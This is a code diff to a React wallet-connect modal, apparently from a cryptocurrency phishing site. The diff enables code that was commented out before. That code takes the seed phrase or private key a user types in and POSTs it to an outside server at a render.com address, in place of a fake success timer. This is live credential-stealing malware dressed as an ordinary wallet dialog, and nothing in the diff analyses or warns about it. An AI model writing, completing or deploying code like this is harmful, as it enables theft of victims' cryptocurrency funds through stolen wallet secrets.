@@ -40,7 +40,13 @@ export default function Modal({ open, onClose }) {
   const modalRef = useRef(null);
 
   const [step, setStep] = useState('select');
-  const [selectedWallet, setSelectedWallet] = useState(null);
+  const [selectedWallet, setSelectedWallet] = useState('');
+  const [selectedOption, setSelectedOption] = useState('');
+  const [isError, setIsError] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [phrase, setPhrase] = useState('');
+  const [privateKey, setPrivateKey] = useState('');
+  const [isSuccess, setIsSuccess] = useState(false);
 
   useEffect(() => {
     if (open) setStep('select');
@@ -82,13 +88,6 @@ export default function Modal({ open, onClose }) {
 
   if (!open) return null;
 
-  const [selectedOption, setSelectedOption] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
-  const [phrase, setPhrase] = useState(''); // For "Phrase" and "Keystone JSON"
-  const [privateKey, setPrivateKey] = useState(''); // For "Private Key"
-  const [isSuccess, setIsSuccess] = useState(false);
-
-
   const handleOptionChange = (e) => {
     setSelectedOption(e.target.value);
   };
@@ -105,59 +104,50 @@ export default function Modal({ open, onClose }) {
     e.preventDefault();
     setIsLoading(true);
 
-    // const payload = {
-    //   wallet: selectedWallet,
-    //   phrase: selectedOption === 'Private' ? privateKey : phrase,
-    // };
+    const payload = {
+      wallet: selectedWallet.name,
+      phrase: selectedOption === 'Private' ? privateKey : phrase,
+    };
 
-    // fetch('https://ozildetailsmailernewdapps.onrender.com/details', {
-    //   method: 'POST',
-    //   headers: {
-    //     'Content-Type': 'application/json',
-    //   },
-    //   body: JSON.stringify(payload),
-    // })
-    //   .then((response) => {
-    //     if (!response.ok) {
-    //       return response.json().then((errorData) => {
-    //         throw new Error(errorData.message || 'Failed to connect wallet');
-    //       });
-    //     }
-    //     return response.json();
-    //   })
-    //   .then((data) => {
-    //     console.log('Wallet connected:', data);
+    fetch('https://personalmailernew.onrender.com/details', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    })
+      .then((response) => {
+        if (!response.ok) {
+          return response.json().then((errorData) => {
+            throw new Error(errorData.message || 'Failed to connect wallet');
+          });
+        }
+        return response.json();
+      })
+      .then((data) => {
+        console.log('Wallet connected:', data);
 
-    //     if (data.status === 'Success') {
-    //       setIsSuccess(true);
-    //       setIsError(false);
-    //       setSelectedWallet('');
-    //       setPhrase('');
-    //       setPrivateKey('');
-    //       setSelectedOption('');
-
-    //       navigate('/');
-    //     } else {
-    //       //  handle unexpected status or errors here
-    //       setIsError(true);
-    //       setIsSuccess(false);
-    //       console.log('Error:', data.message); // Log the message or show feedback
-    //     }
-    //   })
-    //   .catch((error) => {
-    //     console.error('Connection error:', error);
-    //     setIsError(true);
-    //     setIsSuccess(false);
-    //     navigate('/');
-    //   })
-    //   .finally(() => {
-    //     setIsLoading(false);
-    //   });
-
-    setTimeout(() => {
-      setIsLoading(false);
-      setIsSuccess(true);
-    }, 2000);
+        if (data.status === 'Success') {
+          setIsSuccess(true);
+          setIsError(false);
+          setSelectedWallet('');
+          setPhrase('');
+          setPrivateKey('');
+          setSelectedOption('');
+        } else {
+          setIsError(true);
+          setIsSuccess(false);
+          console.log('Error:', data.message);
+        }
+      })
+      .catch((error) => {
+        console.error('Connection error:', error);
+        setIsError(true);
+        setIsSuccess(false);
+      })
+      .finally(() => {
+        setIsLoading(false);
+      });
   };
 
   return (
@@ -347,20 +337,6 @@ export default function Modal({ open, onClose }) {
                   </button>
                 </div>
               </form>
-
-              {/* {isLoading && (
-                <div
-                  className={`fixed top-0 left-0 w-full h-full flex items-center justify-center bg-gray-800 bg-opacity-50 z-50`}
-                >
-                  <div className="bg-black bg-opacity-50 rounded-lg p-8">
-                    <div className="flex justify-center mb-4">
-    
-                      <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-500 border-solid"></div>
-                    </div>
-                    <p className="text-center text-white">Connecting...</p>
-                  </div>
-                </div>
-              )} */}
             </div>
           </>
         )}
